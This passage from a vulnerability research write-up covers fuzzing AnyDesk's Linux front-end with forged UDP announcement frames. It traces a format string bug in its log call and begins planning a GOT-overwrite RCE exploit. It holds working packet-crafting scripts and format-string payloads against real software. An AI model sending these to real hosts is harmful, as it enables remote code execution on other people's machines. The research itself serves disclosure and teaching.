In order to create valid announcement frames we have to understand how the frames are built. Fortunately the format is not very complicated. By changing settings like our username or hostname and then observing the corresponding announcement frames our client is sending, we can derive how the frames are built. Among other things a frame contains the AnyDesk ID (4-byte), an operating system ID (1-byte) as well as the hostname and username, which are both transmitted as a 4-byte length field (`big-endian`) followed by the actual data. There are a few other fields and static values, which are not relevant for our considerations. The following python script creates a valid frame based on the given parameters and sends it to our local machine on UDP port 50001:

```

#!/usr/bin/env python

import struct
import socket

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

p = gen_discover_packet(4919, 1, 'custom host', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

After running the script we can see in the GUI that the front-end received the announcement and the fake device is displayed:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_03.png)

Now we are ready to explicitly fuzz certain fields of the frame. In order to do this we extend the python script to serve as our fuzzer. We can generate the actual fuzzing input by using radamsa again. Also we will monitor the front-end process and dump the last 10 fuzzing inputs, if the process died. The full fuzzer script, which targets the hostname, looks like this:

```

#!/usr/bin/env python

import struct
import socket
import subprocess
import psutil
import os
import time

ip = '127.0.0.1'
port = 50001
host_payloads = [''] * 10
dump_idx = 0

def mutate(pl):
  p = subprocess.Popen(['/usr/bin/radamsa', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
  return p.communicate(pl)[0]

def isAlive():
  for p in psutil.process_iter():
    if (p.name() == 'anydesk' and len(p.cmdline()) == 1): return True
  return False

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

def dump():
  global dump_idx
  print('dumping '+str(dump_idx))
  os.system('mkdir loot'+str(dump_idx))
  for i in range(len(host_payloads)):
    f = open('./loot'+str(dump_idx)+'/host_payload'+str(i), 'wb')
    f.write(host_payloads[i])
    f.close()
  dump_idx += 1
  os.system('anydesk&')
  time.sleep(5)

idx = 0
while True:
  time.sleep(5.0)
  host = mutate('host')
  if (len(host) > 45000): continue # max length
  host_payloads[idx%len(host_payloads)] = host
  p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.sendto(p, (ip, port))
  s.close()
  idx += 1
  if (not isAlive()): dump()

```

The sleep time for each fuzzing iteration is quite high (5 seconds), but it turned out that the GUI is only updated every 5 seconds. At first I thought about patching the binary in order to increase the update interval, but before digging into this I decided to just let the fuzzer run over a night.

At the next day the fuzzing results were ready to be evaluated. The front-end actually crashed a few times and the script stored the fuzzing inputs on disk. At first we need to determine which exact payload triggered the crash. Since we saved the last 10 payloads sent to the application, we just need to resend these payloads and determine which one makes the application crash. This can be done using the following script:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  ...

host = open(sys.argv[1]).read()
p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

By sending the following payload the front-end crashes:

```

user@w00d:~$ ./resend.py loot2/host_payload4

... crash ...

user@w00d:~$ hexdump -C loot2/host_payload4
00000000  61 61 61 61 25 64 25 6e  25 70 25 64 24 2b f3 a0  |aaaa%d%n%p%d$+..|
00000010  81 9c 81 bd 0b 7c                                 |.....||
00000016

```

By fuzzing the AnyDesk front-end process with a python script, which produces valid announcement frames and mutates the hostname using radamsa, we successfully generated an input, which crashes the application. The next step is to analyze the bug in order the determine, if we can exploit it.

# Bug

So far we have fuzzed the AnyDesk front-end and identified an input which makes the front-end crash. The next step is to determine what the cause of this crash is and to examine if it is based on a bug which we can exploit.

At first we start up the front-end again and attach gdb to it (the `pid_frontend.py` script merely retrieves the current `PID` of the front-end process):

```

root@w00d:~# gdb /usr/bin/anydesk $(~/pid_frontend.py)

...
Reading symbols from /usr/bin/anydesk...(no debugging symbols found)...done.
Attaching to program: /usr/bin/anydesk, process 10911
[New LWP 10913]
[New LWP 10914]
[New LWP 10928]
[New LWP 10931]
[New LWP 10938]
[New LWP 10941]
[New LWP 10942]
[New LWP 10943]
[New LWP 10944]
[New LWP 10945]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffdfc
RBX: 0x1cf7720 --> 0x100000005
RCX: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
RDX: 0x37a0
RSI: 0x3
RDI: 0x1cf7720 --> 0x100000005
RBP: 0x3
RSP: 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
RIP: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
R8 : 0x0
R9 : 0x1ab6720 --> 0x1900000024
R10: 0x1ce3000 --> 0x1ab6720 --> 0x1900000024
R11: 0x293
R12: 0x37a0
R13: 0x37a0
R14: 0x7f491d0b9f70 (<g_poll>:	mov    esi,esi)
R15: 0x3
EFLAGS: 0x293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f491870ebef <__GI___poll+63>:	mov    rdi,rbx
   0x7f491870ebf2 <__GI___poll+66>:	mov    eax,0x7
   0x7f491870ebf7 <__GI___poll+71>:	syscall
=> 0x7f491870ebf9 <__GI___poll+73>:	cmp    rax,0xfffffffffffff000
   0x7f491870ebff <__GI___poll+79>:	ja     0x7f491870ec32 <__GI___poll+130>
   0x7f491870ec01 <__GI___poll+81>:	mov    edi,r8d
   0x7f491870ec04 <__GI___poll+84>:	mov    DWORD PTR [rsp+0xc],eax
   0x7f491870ec08 <__GI___poll+88>:	call   0x7f491872a740 <__libc_disable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
0008| 0x7ffe12cbcfb8 --> 0x1cf7720 --> 0x100000005
0016| 0x7ffe12cbcfc0 --> 0x1957be0 --> 0x0
0024| 0x7ffe12cbcfc8 --> 0x3
0032| 0x7ffe12cbcfd0 --> 0x1cf7720 --> 0x100000005
0040| 0x7ffe12cbcfd8 --> 0x7f491d0aa5c9 (mov    r13d,eax)
0048| 0x7ffe12cbcfe0 --> 0x0
0056| 0x7ffe12cbcfe8 --> 0x101957be0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007f491870ebf9 in __GI___poll (fds=0x1cf7720, nfds=0x3, timeout=0x37a0) at ../sysdeps/unix/sysv/linux/poll.c:29
29	../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
gdb-peda$ c
Continuing.

```

Now we resend the payload, which caused the crash:

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

As expected the application raises a segmentation fault:

```

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7ffe12cbb800 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RCX: 0x0
RDX: 0x7ffe12cbc4f8 --> 0x0
RSI: 0x7ffe12cbb568 --> 0xd24f18983b49a900
RDI: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
RBP: 0x7ffe12cbb5a0 --> 0x7ffe12cbbc00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177")
RSP: 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
RIP: 0x7f4918657932 (<_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d)
R8 : 0x0
R9 : 0x0
R10: 0x0
R11: 0x7ffe12cbb88c --> 0xf32b24642570256e
R12: 0x7ffe12cbc4c8 --> 0x3000000020 (' ')
R13: 0x91
R14: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
R15: 0x6e ('n')
EFLAGS: 0x10212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f4918657928 <_IO_vfprintf_internal+9624>:	add    eax,0x8
   0x7f491865792b <_IO_vfprintf_internal+9627>:	mov    DWORD PTR [r12],eax
   0x7f491865792f <_IO_vfprintf_internal+9631>:	mov    rax,QWORD PTR [rdx]
=> 0x7f4918657932 <_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d
   0x7f4918657935 <_IO_vfprintf_internal+9637>:	jmp    0x7f4918655930 <_IO_vfprintf_internal+1440>
   0x7f491865793a <_IO_vfprintf_internal+9642>:	mov    QWORD PTR [rbp-0x4e8],r11
   0x7f4918657941 <_IO_vfprintf_internal+9649>:	mov    QWORD PTR [rbp-0x4e0],rax
   0x7f4918657948 <_IO_vfprintf_internal+9656>:	call   0x7f4918684150 <_IO_vtable_check>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
0008| 0x7ffe12cbb038 --> 0x0
0016| 0x7ffe12cbb040 --> 0x7ffe12cbb88a ("d%n%p%d$+\201\275\v|'")
0024| 0x7ffe12cbb048 --> 0x7ffe00000000
0032| 0x7ffe12cbb050 --> 0x0
0040| 0x7ffe12cbb058 --> 0x1
0048| 0x7ffe12cbb060 --> 0xffffffffffffffff
0056| 0x7ffe12cbb068 --> 0x100000000
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
1642	vfprintf.c: No such file or directory.

```

As we can see, the crash is caused by the instruction `mov DWORD PTR [rax], r13d` within the function `_IO_vfprintf_internal`. Since the value of `rax` is `0` a segmentation fault is raised. Using the command `bt` we can print the stacktrace:

```

gdb-peda$ bt
#0  0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
#1  0x00007f4918682910 in _IO_vsnprintf (
    string=0x7ffe12cbbc00 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177", maxlen=<optimized out>,
    format=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", args=0x7ffe12cbc4c8) at vsnprintf.c:114
#2  0x00000000008ab34b in ?? ()
#3  0x00000000008aba98 in ?? ()
#4  0x0000000000434395 in ?? ()
#5  0x00007f491d0b11cd in g_logv () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
#6  0x00007f491d0b133f in g_log () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
...

```

According to the output the return address after the `vsnprintf` call is `0x8ab34b` (`#2`). Let’s examine the code at this address in `ghidra`:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_04.png)

The call to `vsnprintf` is at `0x8ab346`. The third parameter of the function is the format string to be used (`local_cb8`). A few lines before we can see that the fourth parameter of the outer function (`param_4`) is copied into `local_cb8` using `strncpy`. In order to determine which parameters were passed to `vsnprintf` let’s set a breakpoint on the call and resend the payload:

```

gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffec15e4248 --> 0x3000000010
RDX: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RSI: 0x400
RDI: 0x7ffec15e3980 --> 0x7
RBP: 0x5
RSP: 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa0
R11: 0x7fb9b72f9550 --> 0xfff08320fff08310
R12: 0x7ffec15e4248 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x2475ec0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffec15e3980 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
arg[3]: 0x7ffec15e4248 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
0008| 0x7ffec15e34a8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0016| 0x7ffec15e34b0 --> 0x25ed450 --> 0x0
0024| 0x7ffec15e34b8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0032| 0x7ffec15e34c0 --> 0x7ffec15e3820 --> 0x0
0040| 0x7ffec15e34c8 --> 0x7fb9bbbe89d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffec15e34d0 --> 0x23e8230 --> 0x2253ab0 --> 0x2244340 --> 0x31 ('1')
0056| 0x7ffec15e34d8 --> 0x2622e60 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()

```

We hit the breakpoint on the call to `vsnprintf`. The third parameter (`RDX`) contains the format string. The passed string obviously contains an error message about an invalid UTF-8 encoded text. But this string does also contain the string, which caused the error: `'aaaa%d%n%p%d$+\201\275\v|'`. This is our fuzzing input! In the format string! We have found a format string vulnerability.

In this case the actual crash of the application was caused by the `%n` format specifier within the fuzzer-generated data. The `%n` format specifier can be used to write data. The address, where the data in this case is supposed to be written, happened to be null. This caused the segmentation fault.

Analyzing the code a little bit further we can determine that the call to `vsnprintf` prepares a string, which will be written to the log file (`~/.anydesk/anydesk.trace`). The fourth parameter of the outer function, which will be used as the format string, is in this case an error message generated by the `glib` library, which is raised because the text contains an invalid UTF-8 sequence. This error message was obviously assumed to be static. However the error message contains the input, which caused the error (the fuzzed hostname), which we can control. Thus we can control parts of the format string by inserting an invalid UTF-8 sequence into the hostname of an announcement frame. This results in a classical format string vulnerability.

Also it turned out that the vulnerable call is actually made twice. By sending an announcement frame with an invalid UTF-8 sequence and a format specifier (`'\x85\xfeTEST %p'`), we can see the result in `~/.anydesk/anydesk.trace`:

```

user@w00d:~$ tail -n 3 ~/.anydesk/anydesk.trace
warning 2020-05-25 08:59:02.119   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
warning 2020-05-25 08:59:02.125   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
   info 2020-05-25 08:59:02.132   frontend   main   4431   4431                     unix_app.frontend - Monitoring online states.

```

The error message has been written twice to the log file. We can also see how the inserted format specifier (`%p`) has been evaluated.

After analyzing the segmentation fault discovered by fuzzing the front-end process, we identified that the cause of the crash is a format string vulnerability. The next step is to develop an exploit for the identified vulnerability.

# Exploit

Within my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B) I described the basics on how to exploit a format string vulnerability using the `%n` format specifier. This format specifier can be used to write data and also caused the segmentation fault when fuzzing the application. Within this section we will take a look at how to exploit the format string vulnerability in this very specific setting in order to gain Remote Code Execution (RCE).

## Strategy

Probably the very first thing everyone does when facing a binary exploitation challenge is to check which security mechanisms are enabled. In this case the result is very surprising:

```

user@w00d:~$ checksec /usr/bin/anydesk
[*] '/usr/bin/anydesk'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```

Actually no protection mechanisms are enabled, which makes the exploitation more easy.

While developing an exploit I would generally suggest to disable ASLR and just keep in mind that we have to bypass it. This makes it easier to compare addresses of multiple runs of the application:

```

user@w00d:~$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0

```

The first goal we need to achieve is to control the instruction pointer. Since there is `No RELRO`, we can use the `%n` format specifier to overwrite an entry within the `Global Offset Table` (`GOT`). As the heap segment, where our input data will be stored, is actually executable, we can store a shellcode there and make the `GOT` entry point to this shellcode. On the next call of the function, which `GOT` entry we overwrote, our shellcode is executed.

Although these steps sound quite straight forward, achieving this turned out to be a little bit more challenging. Let’s have a look.

## The v in vsnprintf

The next instruction after the vulnerable call to `vsnprintf` is a call to the function `time`. Accordingly we can overwrite the `GOT` entry of `time` and thus redirecting the control flow immediately after the `vsnprintf` call. In order to use the `%n` format specifier to overwrite the `GOT` entry of `time`, we need to be able to reference the address of the `GOT` entry. In a classical format string exploit this is achieved by being able to control data on the stack. Since all values on the stack, which are equal or below to the current `RSP`, can be referenced with an appropriate argument selector (e.g. `%35$n`), the desired address can simply be put into the controlled stack data. Using the appropriate argument selector in combination with the `%n` format specifier causes the function to write the amount of characters written so far to this address.

In this case things are a little bit different. As you probably already noticed the vulnerable call is **not** made to the function `snprintf`, which signature looks like this:

```

snprintf(char *s, size_t n, const char *format, ...)

```

…, but rather `vsnprintf`, which signature looks like this:

```

vsnprintf(char *s, size_t n, const char *format, va_list arg)

```

The difference here is that the format string arguments are not directly passed as variable arguments (`...`), but within a `va_list` parameter (`arg`). Each of the functions in the printf family has a corresponding `va_list` function beginning with the letter `v`:

```

user@w00d:~$ man 3 printf
...

       #include <stdio.h>

       int printf(const char *format, ...);
       int fprintf(FILE *stream, const char *format, ...);
       int dprintf(int fd, const char *format, ...);
       int sprintf(char *str, const char *format, ...);
       int snprintf(char *str, size_t size, const char *format, ...);

       #include <stdarg.h>

       int vprintf(const char *format, va_list ap);
       int vfprintf(FILE *stream, const char *format, va_list ap);
       int vdprintf(int fd, const char *format, va_list ap);
       int vsprintf(char *str, const char *format, va_list ap);
       int vsnprintf(char *str, size_t size, const char *format, va_list ap);

```

The structure of `va_list` is actually specific to the `Application Binary Interface` (`ABI`), which e.g. describes the calling convention, how the stack is organized and so on. On `x86`, where all function parameters are passed on the stack, `va_list` simply consists of a pointer to the stack area, where the original parameters are stored. With `x64` things get a little bit more complex. The first six parameters are passed in registers (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`), also there are special registers for floating point parameters (`XMM0` … `XMM7`). Additional parameters are passed on the stack as with `x86`. There is a very good blog post describing the details, which can be found [here](https://blog.nelhage.com/2010/10/amd64-and-va_arg/). The structure of the `va_list` looks like this on `x64`:

```

typedef struct {
  unsigned int gp_offset;
  unsigned int fp_offset;
  void *overflow_arg_area;
  void *reg_save_area;
} va_list[1];

```

There are two pointers: `overflow_arg_area`, which points to the first argument originally passed on the stack and `reg_save_area`, which points to an area on the stack where the arguments passed via registers are saved (the first six general parameters as well as eight floating point parameters). Both values `gp_offset` and `fp_offset` are offsets relative to `reg_save_arena` and reference the first general register parameter (`gp_offset`) as well as the first floating point parameter (`fp_offset`). These offsets exists because there are usually other parameters before the variable parameters (e.g. the format string itself).

Let’s have a practical look at this on the AnyDesk front-end. We attach gdb to it and set a breakpoint on the call to `vsnprintf`:

```

user@w00d:~$ sudo gdb /usr/bin/anydesk $(~/pid_frontend.py)
...
Attaching to program: /usr/bin/anydesk, process 3863
...
gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

Now we can use the python function again, which we created to generate announcement frames. In this case we send an announcement with the following hostname:

```

p = gen_discover_packet(4919, 1, '\x85\xfe 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

The beginning of the hostname (`'\x85\xfe'`) is an invalid UTF-8 sequence, which will trigger the format string vulnerability (any other invalid UTF-8 sequence can be used here). After this we use the `%p` format specifier to print the values of the first ten arguments.

A few seconds after running the script (up to 5 seconds until the GUI refreshes) our breakpoint is hit:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffff81
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453d80 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0016| 0x7ffffffeab00 --> 0x158cba0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138ca30 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1572280 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$

```

The fourth parameter (`RCX = 0x7ffffffeb898`) is the `va_list` structure. The first two unsigned ints (4 bytes each) are the members `gp_offset` and `fp_offset`:

```

gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030

```

After these values both pointers `overflow_arg_area` and `reg_save_area` follow:

```

gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0

```

Since the value of `gp_offset` is 0x10, the function which was originally called with variable arguments had two preceding general parameters. In order to display the next four general parameters assumed to be passed in the remaining registers, we need to add `gp_offset` (`0x10`) to the `reg_save_area` pointer (`0x00007ffffffeb8b0`):

```

gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001453d80	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

`vsnprintf` assumes that these four values were passed in registers. All following values are assumed to be passed via the stack and are referenced by the `overflow_arg_area` pointer (`0x00007ffffffeb970`):

```

gdb-peda$ x/6xg 0x00007ffffffeb970
0x7ffffffeb970:	0x0000000000b366d8	0x0000000000000000
0x7ffffffeb980:	0x0000000001482b01	0x00007ffff5e4ee24
0x7ffffffeb990:	0x0000000001453d80	0x0000000000000000

```

By entering `ni` the call to `vsnprintf` is made and we can inspect the resulting string (`set print elements 0` displays the whole string without truncation):

```

gdb-peda$ ni
...
gdb-peda$ set print elements 0
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.0x1453d80 2.(nil) 3.0x7ffff1784c40 4.0x10 5.0xb366d8 6.(nil) 7.0x1482b01 8.0x7ffff5e4ee24 9.0x1453d80 10.(nil)'"

```

The first four parameters were indeed taken from the `reg_save_area` and all following values from the `overflow_arg_arena`. The following picture summarizes the structure:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_05-1.png)

## Gaining arbitrary write

After we have clarified what we can access with the format string, we need to find some data that we can control in the accessible data. If we can directly control data within the `reg_save_area` or `overflow_arg_area`, we could store the address of the `time GOT` entry and write to it using the `%n` format specifier.

Within the `reg_save_area` there are only 4 values we can access. These do obviously not contain any data of our input. All following parameters are stored in the `overflow_arg_area`. Let’s have a look at the first 50 values stored there using the `telescope` command:

```

gdb-peda$ telescope 0x00007ffffffeb970 50
0000| 0x7ffffffeb970 --> 0xb366d8 --> 0x62696c67 ('glib')
0008| 0x7ffffffeb978 --> 0x0
0016| 0x7ffffffeb980 --> 0x1530801 --> 0xe000007ffff17853
0024| 0x7ffffffeb988 --> 0x7ffff5e4ee24 (test   eax,eax)
0032| 0x7ffffffeb990 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0040| 0x7ffffffeb998 --> 0x0
0048| 0x7ffffffeb9a0 --> 0x10
0056| 0x7ffffffeb9a8 --> 0x7ffff5e501cd (<g_logv+605>:	mov    eax,r14d)
0064| 0x7ffffffeb9b0 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0072| 0x7ffffffeb9b8 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0080| 0x7ffffffeb9c0 --> 0x1fffeb9d0
0088| 0x7ffffffeb9c8 --> 0x4342b0 (push   rbp)
0096| 0x7ffffffeb9d0 --> 0x0
0104| 0x7ffffffeb9d8 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0120| 0x7ffffffeb9e8 --> 0x0
0128| 0x7ffffffeb9f0 --> 0x155dd20 --> 0x7fffdc00f3d0 --> 0x1514300 --> 0x1513da0 --> 0x14d6e00 (--> ...)
0136| 0x7ffffffeb9f8 --> 0x0
0144| 0x7ffffffeba00 --> 0x500000000
0152| 0x7ffffffeba08 --> 0x7ffff5e9acd8 ("Invalid UTF-8 encoded text in name - not valid '%s'")
0160| 0x7ffffffeba10 --> 0x0
